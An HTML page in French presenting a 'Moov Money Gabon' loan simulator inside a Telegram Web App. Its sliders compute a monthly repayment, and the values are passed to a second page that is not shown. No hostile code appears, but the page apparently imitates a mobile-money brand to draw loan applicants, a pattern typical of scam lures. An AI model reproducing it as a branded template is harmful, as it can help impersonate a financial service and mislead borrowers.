<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Moov Money - Obtenez Votre Prêt Rapidement</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --moov-orange: #ff6600;
            --moov-blue: #0047ab;
            --moov-hover: #e05a00;
            --bg-color: #f0f4f8;
            --card-bg: #ffffff;
            --calc-bg: #f8fafc;
            --text-main: #1e293b;
            --text-muted: #64748b;
        }

        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }

        .app-header {
            width: 100%;
            background: linear-gradient(135deg, var(--moov-blue), #1e3a8a);
            height: 60px;
            padding: 0 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 100;
            border-bottom: 3px solid var(--moov-orange);
        }

        .header-title { display: flex; align-items: center; font-size: 22px; font-weight: 800; color: white; }
        .header-title .moov { color: var(--moov-orange); margin-right: 6px; }
        .header-title .money { color: #ffffff; }

        .card {
            background: var(--card-bg);
            width: 90%;
            max-width: 440px;
            margin: 20px 0 30px;
            padding: 30px 24px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
            display: flex;
            flex-direction: column;
        }

        .main-title { font-size: 26px; color: var(--text-main); margin: 0 0 12px; text-align: center; font-weight: 800; }
        .subtext { font-size: 13px; color: var(--text-muted); text-align: center; margin-bottom: 28px; }

        .calculator-container { background: var(--calc-bg); border-radius: 12px; padding: 22px 18px 18px; margin-bottom: 24px; border: 1px solid #e2e8f0; }
        .calculator-title { color: var(--text-main); font-weight: 700; font-size: 17px; margin-bottom: 22px; }

        .slider-section { margin-bottom: 22px; }
        .slider-header { display: flex; justify-content: space-between; align-items: center; font-size: 14px; font-weight: 600; margin-bottom: 8px; }
        .accent-text { color: var(--moov-orange); font-weight: 800; font-size: 15px; }

        input[type=range] { -webkit-appearance: none; width: 100%; background: transparent; }
        input[type=range]::-webkit-slider-runnable-track { width: 100%; height: 6px; background: #cbd5e1; border-radius: 3px; }
        input[type=range]::-webkit-slider-thumb { height: 22px; width: 22px; border-radius: 50%; background: var(--moov-blue); cursor: pointer; -webkit-appearance: none; margin-top: -8px; }

        .slider-footer { display: flex; justify-content: space-between; font-size: 11px; color: var(--text-muted); margin-top: 2px; }

        .result-container { background: #ffffff; border: 1px solid #cbd5e1; border-radius: 12px; padding: 16px; display: flex; justify-content: center; align-items: center; gap: 12px; margin-top: 20px; }
        .result-label { font-size: 15px; color: var(--text-main); font-weight: 500; }
        .result-amount { color: var(--moov-orange); font-size: 22px; font-weight: 800; }

        .btn-apply {
            background: var(--moov-orange);
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 800;
            cursor: pointer;
            text-transform: uppercase;
            transition: background 0.2s;
        }
        .btn-apply:hover { background: var(--moov-hover); }

        .footer-banner { width: 100%; text-align: center; padding: 20px; font-size: 12px; color: var(--text-muted); margin-top: auto; }
    </style>
</head>
<body>

<div class="app-header">
    <div style="width: 24px;"></div>
    <div class="header-title">
        <span class="moov">Moov</span><span class="money">Money</span>
    </div>
    <div style="width: 24px;"></div>
</div>

<div class="card">
    <h1 class="main-title">Obtenez Votre Prêt<br>Rapidement</h1>
    <div class="subtext">Approbation rapide • Taux compétitifs • Gabon</div>

    <div class="calculator-container">
        <div class="calculator-title">Simulateur de Prêt</div>

        <div class="slider-section">
            <div class="slider-header">
                <span>Montant du Prêt</span>
                <span id="valAmt" class="accent-text">250 000 FCFA</span>
            </div>
            <input type="range" id="amt" min="10000" max="5000000" step="10000" value="250000">
            <div class="slider-footer">
                <span>10 000 FCFA</span>
                <span>5 000 000 FCFA</span>
            </div>
        </div>

        <div class="slider-section">
            <div class="slider-header">
                <span>Durée du Prêt</span>
                <span id="valDur" class="accent-text">12 mois</span>
            </div>
            <input type="range" id="dur" min="6" max="60" step="1" value="12">
            <div class="slider-footer">
                <span>6 mois</span>
                <span>60 mois</span>
            </div>
        </div>

        <div class="result-container">
            <span class="result-label">Mensualité</span>
            <span id="monthly" class="result-amount">21 875 FCFA</span>
        </div>
    </div>

    <button class="btn-apply" onclick="goToPage2()">FAIRE UNE DEMANDE</button>
</div>

<div class="footer-banner">© 2026 Moov Money Gabon</div>

<script>
    let calculatedMonthly = 21875;
    function formatFCFA(value) { return value.toString().replace(/\B(?=(\d{3})+(?!\d))/g, " "); }
    function update() {
        const principal = Number(document.getElementById('amt').value) || 0;
        const durationMonths = Number(document.getElementById('dur').value) || 1;
        document.getElementById('valAmt').innerText = `${formatFCFA(principal)} FCFA`;
        document.getElementById('valDur').innerText = `${durationMonths} mois`;
        const totalAmount = principal + (principal * 0.05 * (durationMonths / 12));
        calculatedMonthly = Math.round(totalAmount / durationMonths);
        document.getElementById('monthly').innerText = `${formatFCFA(calculatedMonthly)} FCFA`;
    }
    function goToPage2() {
        localStorage.setItem('amount', document.getElementById('amt').value);
        localStorage.setItem('duration', document.getElementById('dur').value);
        localStorage.setItem('monthly_repayment', calculatedMonthly);
        window.location.href = "/page2";
    }
    window.onload = () => {
        if (window.Telegram?.WebApp) { window.Telegram.WebApp.ready(); window.Telegram.WebApp.expand(); }
        document.getElementById('amt').addEventListener('input', update);
        document.getElementById('dur').addEventListener('input', update);
        update();
    };
</script>
</body>
</html>
